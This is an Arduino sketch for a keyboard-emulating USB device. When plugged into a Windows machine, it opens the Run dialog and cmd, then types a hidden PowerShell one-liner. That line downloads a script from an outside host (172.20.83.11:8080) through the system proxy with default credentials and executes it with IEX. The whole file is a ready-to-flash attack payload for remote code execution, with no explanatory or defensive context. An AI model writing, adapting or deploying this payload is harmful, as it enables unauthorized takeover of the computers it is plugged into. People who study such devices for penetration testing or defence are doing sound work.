
#include "Keyboard.h"

void winRun() {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(30);
    Keyboard.releaseAll();
    delay(100);
}

void setup() {
    Keyboard.begin();
    delay(2000);
    winRun();
    Keyboard.println("cmd");
    Keyboard.write(KEY_RETURN);
    delay(500);
    Keyboard.println("powershell.exe -nop -w hidden -c $p=new-object net.webclient;$p.proxy=[Net.WebRequest]::GetSystemWebProxy();$p.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $p.downloadstring('http://172.20.83.11:8080/');"); 
    Keyboard.write(KEY_RETURN);
}

void loop() {
  // put your main code here, to run repeatedly:
}
